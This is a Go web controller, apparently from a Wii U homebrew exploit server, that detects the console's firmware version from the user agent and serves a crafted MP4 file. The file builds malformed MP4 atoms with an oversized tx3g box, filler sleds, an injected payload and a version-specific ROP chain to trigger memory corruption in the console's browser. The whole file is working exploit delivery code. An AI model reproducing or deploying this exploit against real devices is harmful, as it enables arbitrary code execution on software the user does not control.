package controllers

import (
	"bytes"
	"encoding/hex"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/astaxie/beego"
	"github.com/astaxie/beego/context"

	"github.com/mlgd/goHaxServer/lib/util"
	"github.com/mlgd/goHaxServer/lib/wiiu"
)

type HaxController struct {
	beego.Controller
}

func (c *HaxController) Get() {
	version := wiiu.GetSystemVersion(c.Ctx.Input.UserAgent())
	if version == nil {
		c.Ctx.WriteString("")
		return
	}

	uri := c.Ctx.Input.URI()
	if !strings.Contains(uri, "?") {
		c.Ctx.WriteString("Something weird happened in serveHax")
		return
	}

	payloadName := uri[strings.Index(uri, "?")+1:]
	beego.Debug("Payload:", payloadName)

	switch version.Name {
	case "EU_2_0_0", "EU_2_1_0", "EU_4_0_0", "EU_5_0_0", "EU_5_1_0", "EU_5_5_0", "EU_5_5_1", "JP_4_0_0", "JP_5_0_0", "JP_5_1_0", "US_5_0_0", "US_5_1_0", "US_5_5_0", "US_5_5_1":
		beego.Debug("Version:", version.Name)
		var out bytes.Buffer
		serveHax(&out, version, payloadName+".bin")

		writeHeader(c.Ctx, "video/mp4")
		c.Ctx.WriteString(string(out.Bytes()))
		return

	default:
		beego.Warning("Unsupported version:", version.Name)
		c.Ctx.WriteString("Unsupported version: " + version.Name)
		return
	}

}

func writeHeader(ctx *context.Context, contentType string) {
	if strings.Contains(contentType, "video") {
		ctx.Output.Header("Transfer-Encoding", "chunked")
	}
	ctx.Output.Header("Content-Type", contentType)
}

func serveHax(out *bytes.Buffer, systemVersion *wiiu.SystemVersions, payloadName string) bool {
	var tx3gSize uint32 = 32768

	switch systemVersion.Name {
	case "EU_5_3_2", "US_5_3_2", "JP_5_3_2":
		tx3gSize = 30720
	}

	var tx3gRopStart uint32 = tx3gSize - 2048

	var payloadSourceAddress uint32 = 341237032

	var payloadSteam bytes.Buffer

	ropChain := wiiu.RopChain.Generate(payloadSourceAddress-4096, systemVersion, payloadSourceAddress)

	util.WriteUint32(24, &payloadSteam)
	util.WriteUint32(1718909296, &payloadSteam)
	util.WriteUint32(862416950, &payloadSteam)
	util.WriteUint32(256, &payloadSteam)
	util.WriteUint32(1769172845, &payloadSteam)
	util.WriteUint32(862409526, &payloadSteam)

	util.WriteUint32(tx3gSize+4096, &payloadSteam)
	util.WriteUint32(1836019574, &payloadSteam)

	util.WriteUint32(108, &payloadSteam)
	util.WriteUint32(1677721600, &payloadSteam)

	b, _ := hex.DecodeString("00000000C95B811AC95B811AFA0002580000022D000100000100000000000000000000000000FFFFF1000000000000000000000000010000000000000000000000000000400000000000000000000000000015696F6473000000001007004FFFFF2803FF")
	payloadSteam.Write(b)

	util.WriteUint32(tx3gSize+2048, &payloadSteam)
	util.WriteUint32(1953653099, &payloadSteam)

	util.WriteUint32(92, &payloadSteam)
	util.WriteUint32(1953196132, &payloadSteam)
	b, _ = hex.DecodeString("00000001C95B811AC95B811A00000001000000000000022D000000000000000000000000010000000001000000000000000800000000000000010000000000000000000000000000400000000000100000000000")
	payloadSteam.Write(b)

	util.WriteUint32(tx3gSize, &payloadSteam)
	util.WriteUint32(1954034535, &payloadSteam)

	var payload []byte
	var i uint32
	for i = 0; i < tx3gSize-8; i += 4 {
		if i < 24576 {
			if i < 4096 {
				util.WriteUint32(1610612736, &payloadSteam)
			} else if i < 20480 {
				payload = wiiu.Payload.GeneratePayload(systemVersion, payloadName)
				payloadSteam.Write(payload)
				i += uint32(len(payload)) - 4
				if (i + 4) >= 24576 {
					beego.Error("Payload to big!")
					return false
				}

				for (i + 4) < 20480 {
					util.WriteUint32(2425393296, &payloadSteam)
					i += 4
				}
			} else {
				util.WriteUint32(1482184792, &payloadSteam)
			}
		} else if i < tx3gRopStart {
			util.WriteUint32(systemVersion.Constants.POPJUMPLR_STACK12, &payloadSteam)
		} else if i == tx3gRopStart {
			util.WriteUint32(systemVersion.Constants.POPJUMPLR_STACK12, &payloadSteam)
			util.WriteUint32(1212696648, &payloadSteam)
			i += 8
			payloadSteam.Write(ropChain)
			i += uint32(len(ropChain)) - 4
		} else {
			util.WriteUint32(1212696648, &payloadSteam)
		}
	}

	util.WriteUint32(453, &payloadSteam)
	util.WriteUint32(1835297121, &payloadSteam)
	util.WriteUint32(1, &payloadSteam)
	util.WriteUint32(1954034535, &payloadSteam)
	util.WriteUint32(1, &payloadSteam)
	util.WriteUint32(uint32(4294967296-uint64(tx3gSize)), &payloadSteam)

	for i = 0; i < 8192; i += 4 {
		util.WriteUint32(2224400052, &payloadSteam)
	}

	payload = payloadSteam.Bytes()
	out.Write(payload)

	os.Mkdir("dump", 0777)
	if err := ioutil.WriteFile(filepath.Join("dump", systemVersion.Name+"_"+payloadName+".mp4"), payload, 0660); err != nil {
		beego.Error(err)
	}

	return true
}
